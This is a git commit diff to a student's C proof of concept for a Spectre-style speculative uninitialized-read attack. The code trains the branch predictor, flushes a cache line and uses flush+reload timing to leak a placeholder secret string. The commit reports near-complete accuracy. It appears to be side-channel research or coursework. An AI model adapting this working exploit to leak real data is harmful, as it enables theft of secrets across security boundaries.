4a5029181314ad6529eeef6348cc1232c13eb702
Chris Wagenaar <c.c.j.wagenaar@student.vu.nl>
2023-05-18 22:23:58 +0200

    near 100% accuracy on unitialized_read

--- unititialized_read/uninit_read.c
+++ unititialized_read/uninit_read.c
@@ -1,6 +1,6 @@
 #include <stdio.h>
 #include <stdlib.h>
-
+#include <time.h>
 #include "../lib/gen_array.c"
 #include "../lib/time_and_flush.c"
 #include "../lib/print_results.c"
@@ -10,27 +10,28 @@
 #define CACHE_HIT 100
 #define MAYBE_CACHE_HIT 175
 #define SECRET_SIZE 8
-#define N_TRAINING 10
+#define N_TRAINING 100
 #define SECRET "mysecret"
 #define false 0
 #define true  1
 
 #define DBG false
 
-int i_global;
-int j_global;
-int k_global;
+
+//int* i_global;
+//int* j_global;
+//int* k_global;
 cp_t* flush_reload_arr;
 
-void victim_subfunc() {
+void victim_subfunc(int i) {
     //char secret_char = SECRET[i_global];
     //volatile cp_t cp = flush_reload_arr[secret_char];
-    volatile cp_t cp = flush_reload_arr[SECRET[i_global]];
+    volatile cp_t cp = flush_reload_arr[SECRET[i]];
     //if(DBG) printf("\tstoring %c in fr_arr\n", secret_char);
 }
 
-void attacker_func(int secret_index) {
-    i_global = secret_index;
+void attacker_func(int* i_addr, int secret_index) {
+    *i_addr = secret_index;
     //if(DBG) printf("\ti_gbl = %d\n", secret_index);
 }
 
@@ -44,46 +45,61 @@ void attacker_func(int secret_index) {
  */
 int victim_main_func(int initialize_index, int secret_index) {
 
-        volatile char* scrt = SECRET;
-        volatile int i_gbl = i_global;
 
-        char initialized[3] __attribute__ ((aligned (256)));
-        for(int i = 0; i < 3; i++) initialized[i] = false;  //all false
+    int i,j,k;
+    int* i_j_k_addresses[3];
+    i_j_k_addresses[0] = &i;
+    i_j_k_addresses[1] = &j;
+    i_j_k_addresses[2] = &k;
 
-        if      (initialize_index == 0) {
-            i_global = 0;
-            initialized[0] = true;
-            //if(DBG) printf("\ti_gbl = 0, init[0] = true\n");
+    char initialized[3] __attribute__ ((aligned (256)));
+    for(int iter = 0; iter < 3; iter++) initialized[iter] = false;  //all false
 
-        }
-        else if (initialize_index == 1)	{
-            j_global = 1;
-            initialized[1] = true;
-            //if(DBG) printf("\tj_gbl = 1, init[1] = true\n");
-        }
-        else if (initialize_index == 2)	{
-            j_global = 2;
-            initialized[2] = true;
-            //if(DBG) printf("\tk_gbl = 2, init[2] = true\n");
-        }
+    //BRO THIS IS A BRANCH, INFLUENCING THE BRANCH PREDICTOR
+    *i_j_k_addresses[initialize_index] = initialize_index;
+    initialized[initialize_index] = true;
+    /*if      (initialize_index == 0) {
+        i = 0;
+        //i_global = &i;
+        initialized[0] = true;
+        //if(DBG) printf("\ti_gbl = 0, init[0] = true\n");
 
-        attacker_func(secret_index);
+    }
+    else if (initialize_index == 1)	{
+        j = 1;
+        //j_global = &j;
+        initialized[1] = true;
+        //if(DBG) printf("\tj_gbl = 1, init[1] = true\n");
+    }
+    else if (initialize_index == 2)	{
+        k = 2;
+        //k_global = &k;
+        initialized[2] = true;
+        //if(DBG) printf("\tk_gbl = 2, init[2] = true\n");
+    }*/
+
+    attacker_func(&i, secret_index);
+
+    //put the required variables in cache
+    volatile char* scrt = SECRET;
+    volatile int i_copy = i;
+    //if(initialize_index==2) printf("\ti = %d\n", i);
+
+    cpuid();
+    flush((void*)&initialized[0]);
+    cpuid();
+
+    //volatile cp_t cp0 = flush_reload_arr[initialized[0]];
+    if(initialized[0]) {
         //volatile cp_t cp0 = flush_reload_arr[0];
+        //if(DBG) printf("\tinit[0] is true. \n");
 
-        //printf("load i_gbl = %d\n", time_mem_load((void*)&i_global));
-
-        cpuid();
-        flush((void*)&initialized[0]);
-        cpuid();
-
-        if(initialized[0]) {
-            //if(DBG) printf("\tinit[0] is true. \n");
-            //volatile cp_t cp1 = flush_reload_arr[1];
-            victim_subfunc();
-            //volatile cp_t cp = flush_reload_arr[SECRET[i_global]];
-        }
+        //victim_subfunc(i);
+        volatile cp_t cp = flush_reload_arr[SECRET[i]];
+    }
 
 }
+//printf("load initialized[0] = %d\n", time_mem_load((void*)&initialized[0]));
 
 int* prepare(int secret_index) {
 
@@ -91,7 +107,7 @@ int* prepare(int secret_index) {
     flush_arr((void*)flush_reload_arr, N_PAGES);
 
     //access decisions in array, repeated out-of-bounds not traceable for branch predictor
-    int n_accesses = N_TRAINING + 1;
+    int n_accesses = N_TRAINING -(rand() % (N_TRAINING/2)) + 1;
     char init_indices[n_accesses];
     char secret_indices[n_accesses];
     for(int i = 0; i < n_accesses; i++) {
@@ -122,7 +138,7 @@ int* prepare(int secret_index) {
 }
 
 int main(int argc, char** argv) {
-
+    srand(time(0));
     int*** results = alloc_results(REPETITIONS, SECRET_SIZE, N_PAGES); //results[REPETITIONS][SECRET_SIZE][N_PAGES]ints
 
     //results[0][0] = prepare(1);
